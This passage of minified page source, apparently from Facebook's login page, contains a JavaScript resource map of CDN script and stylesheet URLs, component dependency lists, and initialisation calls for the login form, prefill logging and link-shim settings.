                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/r\/a9qcDZhhs-E.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "3S+b7\/C": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/l\/0,cross\/vxPv-4GQU4l.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "4jeu5\/P": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/vEfZNDiHMZM.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "dR6u8Sp": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/AVhdpE-MtdA.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Oer6m90": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/l\/0,cross\/MMjwE5x6nOR.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "4KcY+D3": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imlR4\/yk\/l\/en_GB\/N_Nl9rOLRfY.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "AfiT0rE": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/l\/0,cross\/xtpBPikTnJ4.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "i+f12sS": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/-afjDFBW5vI.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "GrxWX2e": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/l\/0,cross\/PvVzX9EAKFa.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "97X9Er6": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ilIY4\/yI\/l\/en_GB\/GwO5npTu9S-.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "gjvQzmd": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/qxrRdz8xBLN.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "nNxjF+N": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yT\/l\/en_GB\/EXLBsi07Z2u.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "jj29UZB": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/r\/w5W7kbBpKe-.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "s9PMVbV": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/l\/0,cross\/Mpk6kGnHUI9.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "9NUUUa0": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i8NL4\/ya\/l\/en_GB\/2gaQnCntRO4.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "PqsuCK3": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/-8AOJN40eEL.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "XxpG1bw": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3icQt4\/yY\/l\/en_GB\/0wpqQJ0ior2.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "BDRtk+C": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7Be4\/y3\/l\/en_GB\/sxvbRcCIwzP.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "rZQ94Vk": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/r\/qUWZxQkFRXp.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "6GXEuOP": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3io5E4\/yB\/l\/en_GB\/S5vDbpZ8hGI.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "DmZaoou": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/l\/0,cross\/9e5JF-JjQsl.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "ll4ZG\/y": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ijzQ4\/y-\/l\/en_GB\/ubwHC4ko-Mh.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "YfGiWSf": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i5zl4\/ym\/l\/en_GB\/ocu8no9ZESJ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "nzAKvLy": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/r\/6WPJyp5Ha0j.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "CqRCJKl": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikxI4\/y2\/l\/en_GB\/ZV0eGRL8dBq.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "x390Ori": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iz8e4\/yi\/l\/en_GB\/6EUjMAO_7fU.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "gWMJgTe": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/iGksp69foR_.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "hIek+bG": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Gj8v9L4": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/ah4jcC-CgjO.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "HEK24ug": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4lr4\/y9\/l\/en_GB\/v1_g_3_apql.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "H5bCtaT": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ioDc4\/yx\/l\/en_GB\/6_78JPCXFiD.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "9yHuaYt": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTfb4\/yO\/l\/en_GB\/Cr3WWlQP8iH.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "8ELCBwH": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "uYPxVKP": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ijy74\/yl\/l\/en_GB\/nK6BiDYPrkT.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "SWx3yNv": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/O_SjdcR-xKL.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "x22Oby4": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/fN3cCj7Il4D.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "oE4DofT": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "VvVFw8n": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "IgTGe9E": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/JjKSDhUp5va.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/rO0lbn": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yX\/r\/ENZpdW0JbdZ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "P\/mr5VE": {
                    "type": "css",
                    "src": "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}",
                    "nc": 1,
                    "d": 1
                }
            },
            "compMap": {
                "ODS": {
                    "r": ["8zbEZtu", "hKY0QKT"],
                    "be": 1
                },
                "Dock": {
                    "r": ["8zbEZtu", "3MH7CcU", "A9ciVB9", "X9nr65a", "PMEs\/oy", "FY\/FPFf", "D25C7Qe",
                        "lWOvGTa", "vGt2mxz", "6qbw3PQ", "BIylKC4", "A\/uI0x1"
                    ],
                    "be": 1
                },
                "WebSpeedInteractionsTypedLogger": {
                    "r": ["8zbEZtu", "aFyazmN", "hKY0QKT", "BIylKC4"],
                    "rds": {
                        "m": ["BanzaiScuba_DEPRECATED"]
                    },
                    "be": 1
                },
                "AsyncRequest": {
                    "r": ["8zbEZtu", "h3ZzAmG", "LfFe6kq", "vGt2mxz", "A\/uI0x1", "D25C7Qe"],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                        "r": ["BIylKC4", "hKY0QKT"]
                    },
                    "be": 1
                },
                "DOM": {
                    "r": ["8zbEZtu", "vGt2mxz", "D25C7Qe"],
                    "be": 1
                },
                "Form": {
                    "r": ["8zbEZtu", "Z2GjVu9", "vGt2mxz", "D25C7Qe"],
                    "be": 1
                },
                "FormSubmit": {
                    "r": ["8zbEZtu", "cHw9EiA", "Z2GjVu9", "h3ZzAmG", "LfFe6kq", "vGt2mxz", "A\/uI0x1",
                        "D25C7Qe"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"],
                        "r": ["BIylKC4", "hKY0QKT"]
                    },
                    "be": 1
                },
                "Input": {
                    "r": ["Z2GjVu9"],
                    "be": 1
                },
                "Live": {
                    "r": ["2\/maQ\/Q", "8zbEZtu", "e9ANzw\/", "vGt2mxz", "\/o5YvO2", "A\/uI0x1",
                        "D25C7Qe"
                    ],
                    "be": 1
                },
                "Toggler": {
                    "r": ["8zbEZtu", "PMEs\/oy", "D25C7Qe", "lWOvGTa", "vGt2mxz", "6qbw3PQ", "BIylKC4",
                        "A\/uI0x1"
                    ],
                    "be": 1
                },
                "Tooltip": {
                    "r": ["chXwPrU", "R5w1rCJ", "8zbEZtu", "XJ5NO10", "3MH7CcU", "P0gULGo", "A9ciVB9",
                        "plCHOrr", "X9nr65a", "oMuhfU0", "PMEs\/oy", "eMkMxHZ", "h3ZzAmG",
                        "FY\/FPFf", "D25C7Qe", "76ZdTpL", "CGkH4FY", "lWOvGTa", "LfFe6kq",
                        "vGt2mxz", "BIylKC4", "A\/uI0x1", "Yv35Of2", "wZHTkda", "Z2GjVu9", "Ufq6YWX"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions",
                            "BanzaiScuba_DEPRECATED", "Animation"
                        ],
                        "r": ["hKY0QKT", "ZEC4RrQ", "e9ANzw\/"]
                    },
                    "be": 1
                },
                "URI": {
                    "r": [],
                    "be": 1
                },
                "trackReferrer": {
                    "r": [],
                    "rds": {
                        "m": ["BanzaiScuba_DEPRECATED"],
                        "r": ["8zbEZtu", "hKY0QKT", "BIylKC4"]
                    },
                    "be": 1
                },
                "PhotoTagApproval": {
                    "r": ["tjmk+0K", "8zbEZtu", "xMD047c", "vGt2mxz", "D25C7Qe"],
                    "be": 1
                },
                "PhotoSnowlift": {
                    "r": ["chXwPrU", "FJvGK\/j", "R5w1rCJ", "ZEC4RrQ", "RP11ezO", "q1jSZ8c", "jQ7n\/9j",
                        "8zbEZtu", "m9E98Lv", "kKVtO2\/", "XJ5NO10", "ZWJ8x8U", "IG5yJFM",
                        "KB6j3qk", "Kug8xTf", "3MH7CcU", "5qK10mh", "lwT5Qxw", "mRpDwmd", "P0gULGo",
                        "cY7dHRj", "e9ANzw\/", "QQNFBB\/", "x+GAcDa", "A9ciVB9", "plCHOrr",
                        "MSomlIN", "J+\/gBxk", "X9nr65a", "oMuhfU0", "RpMu8Hd", "PMEs\/oy",
                        "Z2GjVu9", "eMkMxHZ", "iWdauk4", "Rl605H1", "ufOl4jH", "xMD047c", "0Nf5uNX",
                        "h3ZzAmG", "Pd9Vjxl", "FY\/FPFf", "aZWpYjE", "Lp36YXT", "3UeSsX3",
                        "D25C7Qe", "76ZdTpL", "ORqutGC", "CGkH4FY", "lGsKmiB", "GpQFBwL", "79V9cVZ",
                        "lWOvGTa", "sO1pcOq", "aG0dwgI", "5VxCd4H", "DvCGkgX", "LfFe6kq", "zGJBAAP",
                        "vGt2mxz", "\/o5YvO2", "uditdoq", "6qbw3PQ", "hKY0QKT", "BIylKC4",
                        "A\/uI0x1", "Vcys0\/C", "5iBhcTI", "Yv35Of2", "Ai897fY", "HNJlz0f",
                        "cYU3c32", "jeEsBKc", "wZHTkda", "Ufq6YWX", "dx\/AgpO"
                    ],
                    "rds": {
                        "m": ["Animation", "VisualCompletionGating", "FbtLogging",
                            "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions"
                        ]
                    },
                    "be": 1
                },
                "PhotoTagger": {
                    "r": ["chXwPrU", "6Wqo+6+", "R5w1rCJ", "ZEC4RrQ", "RP11ezO", "q1jSZ8c", "tjmk+0K",
                        "8zbEZtu", "m9E98Lv", "kKVtO2\/", "XJ5NO10", "ZWJ8x8U", "KB6j3qk",
                        "Kug8xTf", "3S+b7\/C", "4jeu5\/P", "3MH7CcU", "dR6u8Sp", "lwT5Qxw",
                        "mRpDwmd", "P0gULGo", "e9ANzw\/", "x+GAcDa", "A9ciVB9", "plCHOrr",
                        "Oer6m90", "X9nr65a", "oMuhfU0", "4KcY+D3", "AfiT0rE", "PMEs\/oy",
                        "Z2GjVu9", "i+f12sS", "GrxWX2e", "eMkMxHZ", "97X9Er6", "iWdauk4", "Rl605H1",
                        "gjvQzmd", "nNxjF+N", "xMD047c", "jj29UZB", "0Nf5uNX", "h3ZzAmG", "Pd9Vjxl",
                        "s9PMVbV", "FY\/FPFf", "9NUUUa0", "aZWpYjE", "Lp36YXT", "PqsuCK3",
                        "3UeSsX3", "D25C7Qe", "XxpG1bw", "BDRtk+C", "rZQ94Vk", "6GXEuOP", "76ZdTpL",
                        "ORqutGC", "CGkH4FY", "lGsKmiB", "GpQFBwL", "79V9cVZ", "lWOvGTa", "sO1pcOq",
                        "aG0dwgI", "DmZaoou", "ll4ZG\/y", "LfFe6kq", "vGt2mxz", "\/o5YvO2",
                        "uditdoq", "hKY0QKT", "BIylKC4", "A\/uI0x1", "Vcys0\/C", "5iBhcTI",
                        "YfGiWSf", "Yv35Of2", "nzAKvLy", "Ai897fY", "cYU3c32", "wZHTkda", "Ufq6YWX",
                        "dx\/AgpO"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED",
                            "PageTransitions", "Animation"
                        ]
                    },
                    "be": 1
                },
                "PhotoTags": {
                    "r": ["tjmk+0K", "8zbEZtu", "xMD047c", "vGt2mxz", "BIylKC4", "D25C7Qe"],
                    "be": 1
                },
                "TagTokenizer": {
                    "r": ["tjmk+0K", "8zbEZtu", "ZWJ8x8U", "4KcY+D3", "PMEs\/oy", "Z2GjVu9", "h3ZzAmG",
                        "CqRCJKl", "s9PMVbV", "3UeSsX3", "D25C7Qe", "x390Ori", "lWOvGTa", "vGt2mxz",
                        "BIylKC4", "Ai897fY"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                        "r": ["hKY0QKT"]
                    },
                    "be": 1
                },
                "AsyncDialog": {
                    "r": ["R5w1rCJ", "ZEC4RrQ", "8zbEZtu", "XJ5NO10", "lwT5Qxw", "A9ciVB9", "MSomlIN",
                        "X9nr65a", "oMuhfU0", "PMEs\/oy", "Z2GjVu9", "eMkMxHZ", "0Nf5uNX",
                        "h3ZzAmG", "FY\/FPFf", "Lp36YXT", "3UeSsX3", "D25C7Qe", "76ZdTpL",
                        "79V9cVZ", "lWOvGTa", "LfFe6kq", "vGt2mxz", "uditdoq", "6qbw3PQ", "hKY0QKT",
                        "BIylKC4", "A\/uI0x1", "Yv35Of2", "cYU3c32", "wZHTkda", "dx\/AgpO"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                    },
                    "be": 1
                },
                "Hovercard": {
                    "r": ["chXwPrU", "R5w1rCJ", "8zbEZtu", "XJ5NO10", "3MH7CcU", "P0gULGo", "A9ciVB9",
                        "plCHOrr", "X9nr65a", "oMuhfU0", "PMEs\/oy", "Z2GjVu9", "i+f12sS",
                        "GrxWX2e", "eMkMxHZ", "nNxjF+N", "h3ZzAmG", "FY\/FPFf", "3UeSsX3",
                        "D25C7Qe", "76ZdTpL", "CGkH4FY", "lGsKmiB", "lWOvGTa", "LfFe6kq", "vGt2mxz",
                        "hKY0QKT", "BIylKC4", "A\/uI0x1", "Yv35Of2", "Ai897fY", "wZHTkda", "Ufq6YWX"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED",
                            "PageTransitions", "Animation"
                        ],
                        "r": ["ZEC4RrQ", "e9ANzw\/"]
                    },
                    "be": 1
                },
                "XSalesPromoWWWDetailsDialogAsyncController": {
                    "r": ["gWMJgTe"],
                    "be": 1
                },
                "XOfferController": {
                    "r": ["hIek+bG"],
                    "be": 1
                },
                "PerfXSharedFields": {
                    "r": ["BIylKC4"],
                    "be": 1
                },
                "KeyEventTypedLogger": {
                    "r": ["8zbEZtu", "Gj8v9L4", "hKY0QKT", "BIylKC4"],
                    "rds": {
                        "m": ["BanzaiScuba_DEPRECATED"]
                    },
                    "be": 1
                },
                "Dialog": {
                    "r": ["8zbEZtu", "cY7dHRj", "X9nr65a", "RpMu8Hd", "PMEs\/oy", "Z2GjVu9", "h3ZzAmG",
                        "FY\/FPFf", "D25C7Qe", "lWOvGTa", "LfFe6kq", "vGt2mxz", "BIylKC4",
                        "A\/uI0x1", "R5w1rCJ", "ZEC4RrQ", "e9ANzw\/", "A9ciVB9", "oMuhfU0",
                        "eMkMxHZ", "Ufq6YWX"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent", "Animation", "PageTransitions",
                            "BanzaiScuba_DEPRECATED"
                        ],
                        "r": ["hKY0QKT"]
                    },
                    "be": 1
                },
                "ExceptionDialog": {
                    "r": ["R5w1rCJ", "ZEC4RrQ", "8zbEZtu", "XJ5NO10", "KB6j3qk", "lwT5Qxw", "x+GAcDa",
                        "A9ciVB9", "MSomlIN", "X9nr65a", "oMuhfU0", "PMEs\/oy", "Z2GjVu9",
                        "eMkMxHZ", "0Nf5uNX", "h3ZzAmG", "FY\/FPFf", "Lp36YXT", "3UeSsX3",
                        "D25C7Qe", "HEK24ug", "76ZdTpL", "ORqutGC", "79V9cVZ", "lWOvGTa", "LfFe6kq",
                        "vGt2mxz", "uditdoq", "6qbw3PQ", "hKY0QKT", "H5bCtaT", "BIylKC4",
                        "A\/uI0x1", "Yv35Of2", "9yHuaYt", "cYU3c32", "wZHTkda"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                    },
                    "be": 1
                },
                "QuickSandSolver": {
                    "r": ["ZEC4RrQ", "8zbEZtu", "m9E98Lv", "8ELCBwH", "Z2GjVu9", "h3ZzAmG", "uYPxVKP",
                        "LfFe6kq", "vGt2mxz", "SWx3yNv", "x22Oby4", "A\/uI0x1", "D25C7Qe"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                        "r": ["BIylKC4", "hKY0QKT"]
                    },
                    "be": 1
                },
                "ConfirmationDialog": {
                    "r": ["8zbEZtu", "Z2GjVu9", "oE4DofT", "vGt2mxz", "BIylKC4", "D25C7Qe"],
                    "be": 1
                },
                "QPLInspector": {
                    "r": ["VvVFw8n"],
                    "be": 1
                }
            }
        })
    });
    </script>
    <script>
    requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
        InitialJSLoader.loadOnDOMContentReady(["IgTGe9E", "A\/uI0x1", "BIylKC4", "8zbEZtu", "vGt2mxz",
            "hKY0QKT", "mRpDwmd", "h3ZzAmG", "LfFe6kq", "ZEC4RrQ", "cYU3c32", "\/rO0lbn", "Z2GjVu9",
            "lWOvGTa", "P\/mr5VE"
        ]);
    });
    </script>
    <script>
    requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        var s = (new ServerJS());
        s.handle({
            "define": [
                ["LinkshimHandlerConfig", [], {
                    "supports_meta_referrer": true,
                    "default_meta_referrer_policy": "origin-when-crossorigin",
                    "switched_meta_referrer_policy": "origin",
                    "non_linkshim_lnfb_mode": null,
                    "link_react_default_hash": "AT1VXY_SYpNfQY2sPCl1HV7BqIOxOOzID6dU1HzXkw0yegIlDGS85M7QMTABHRAaV7ifb-pgF637nDBvpM0M58BWwQGF3qkHk6jggQWkGeEvOYfqp2iwJfR-tqDiaC1BgktAjRAoQIJ6wujJMHH6peiVw25yJYhhl02pqQ",
                    "untrusted_link_default_hash": "AT0Ki-8UsonLD79r2Sx4c_qUXmZKnUktJJmpUSCMapgUi2oF6i2toPOBCZPFp8JMXLGfrGZmrh_LaLOppCcO3QlhnvcL9dbgwZLVh0eDFzkERzgmpRq-Y_glOr8J-ja8xkpiVzQHt-_xNz30mAUxJWZs3av6cB_-BjKwJg",
                    "linkshim_host": "l.facebook.com",
                    "linkshim_path": "\/l.php",
                    "linkshim_enc_param": "h",
                    "linkshim_url_param": "u",
                    "use_rel_no_opener": true,
                    "always_use_https": true,
                    "onion_always_shim": true,
                    "middle_click_requires_event": true,
                    "www_safe_js_mode": "asynclazy",
                    "m_safe_js_mode": "MLynx_asynclazy",
                    "ghl_param_link_shim": false,
                    "click_ids": [],
                    "is_linkshim_supported": true,
                    "current_domain": "facebook.com",
                    "blocklisted_domains": ["ad.doubleclick.net",
                        "ads-encryption-url-example.com", "bs.serving-sys.com",
                        "ad.atdmt.com", "adform.net", "ad13.adfarm1.adition.com",
                        "ilovemyfreedoms.com", "secure.adnxs.com"
                    ],
                    "is_mobile_device": false
                }, 27]
            ],
            "elements": [
                ["__elem_a588f507_0_1_In", "u_0_1_3y", 1],
                ["__elem_a588f507_0_0_Wz", "globalContainer", 2],
                ["__elem_a588f507_0_2_oL", "content", 1],
                ["__elem_835c633a_0_0_0F", "u_0_2_O9", 1],
                ["__elem_9f5fac15_0_0_tq", "passContainer", 1],
                ["__elem_558608f3_0_0_zR", "pass", 1],
                ["__elem_a588f507_0_3_1k", "u_0_3_Lf", 1],
                ["__elem_a588f507_0_4_lJ", "u_0_4_\/i", 1],
                ["__elem_45d73b5d_0_0_GI", "u_0_5_O+", 1]
            ],
            "require": [
                ["ServiceWorkerLoginAndLogout", "login", [],
                    []
                ],
                ["WebPixelRatioDetector", "startDetecting", [],
                    [false]
                ],
                ["ScriptPath", "set", [],
                    ["XIndexReduxController", "a1f3c513", {
                        "imp_id": "0Z80a3YjOJ5J57kOv",
                        "ef_page": null,
                        "uri": "https:\/\/www.facebook.com\/"
                    }]
                ],
                ["UITinyViewportAction", "init", [],
                    []
                ],
                ["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0_Wz"],
                    [{
                        "__m": "__elem_a588f507_0_0_Wz"
                    }]
                ],
                ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_a588f507_0_0_Wz"],
                    [
                        [{
                            "__m": "__elem_a588f507_0_0_Wz"
                        }]
                    ]
                ],
                ["KeyboardActivityLogger", "init", [],
                    []
                ],
                ["FocusRing", "init", [],
                    []
                ],
                ["ErrorMessageConsole", "listenForUncaughtErrors", [],
                    []
                ],
                ["HardwareCSS", "init", [],
                    []
                ],
                ["IntlUtils"],
                ["LoginFormController", "init", ["__elem_835c633a_0_0_0F",
                        "__elem_45d73b5d_0_0_GI"
                    ],
                    [{
                        "__m": "__elem_835c633a_0_0_0F"
                    }, {
                        "__m": "__elem_45d73b5d_0_0_GI"
                    }, null, true, {
                        "pubKey": {
                            "publicKey": "dae4252154464ddb07a7fd72725a1b28a8d03eff2952d4f750fdcf943e9e5660",
                            "keyId": 72
                        }
                    }]
                ],
                ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
                    [{
                        "contactpointFieldID": "email",
                        "serverPrefill": ""
                    }]
                ],
                ["BrowserPrefillLogging", "initPasswordFieldLogging", [],
                    [{
                        "passwordFieldID": "pass"
                    }]
                ],
                ["FocusListener"],
                ["FlipDirectionOnKeypress"],
                ["LoginFormToggle", "initToggle", ["__elem_a588f507_0_3_1k",
                        "__elem_a588f507_0_4_lJ", "__elem_558608f3_0_0_zR", "__elem_9f5fac15_0_0_tq"
                    ],
                    [{
                        "__m": "__elem_a588f507_0_3_1k"
                    }, {
                        "__m": "__elem_a588f507_0_4_lJ"
                    }, {
                        "__m": "__elem_558608f3_0_0_zR"
                    }, {
                        "__m": "__elem_9f5fac15_0_0_tq"
                    }]
                ],
                ["FBLynx", "setupDelegation", [],
                    []
                ],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"], "sd"
                    ]
                ],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"], "css"
                    ]
                ],
                ["TimeSliceImpl"],
                ["HasteSupportData"],
                ["ServerJS"],
                ["Run"],
                ["InitialJSLoader"]
            ],
            "contexts": [
                [{
                    "__m": "__elem_a588f507_0_1_In"
                }, true],
                [{
                    "__m": "__elem_a588f507_0_2_oL"
                }, true]
            ]
        });
        requireLazy(["Run"], function(Run) {
            Run.onAfterLoad(function() {
                s.cleanup(TimeSlice)
            })
        });
    });
    </script>
    <script>
    now_inl = (function() {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart ? function() {
            return p.now() + p.timing.navigationStart
        } : function() {
            return new Date().getTime()
        };
    })();
    window.__bigPipeFR = now_inl();
    </script>
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/l/0,cross/kA3l8N-Pefi.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/l/0,cross/Usgpzs7Ek9w.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/l/0,cross/s1CjjB0KT8v.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/REo_wjzk_bY.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/r/G76sQY80s37.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/w8iOGQ_Hw3c.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/sczXDyPA0UL.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/l_dEElJiBCo.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/GG1Y0sYc7My.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yQ/l/en_GB/wCXZ1rLp_Gz.js?_nc_x=Ij3Wp8lg5Kz"
        as="script" crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/nHDYRDL5JAA.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/jQFlt4gyp9R.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="SXJL9M30" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/uaRUZk18yNI.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <script>
    window.__bigPipeCtor = now_inl();
    requireLazy(["BigPipe"], function(BigPipe) {
        define("__bigPipe", [], window.bigPipe = new BigPipe({
            "forceFinish": true,
            "config": {
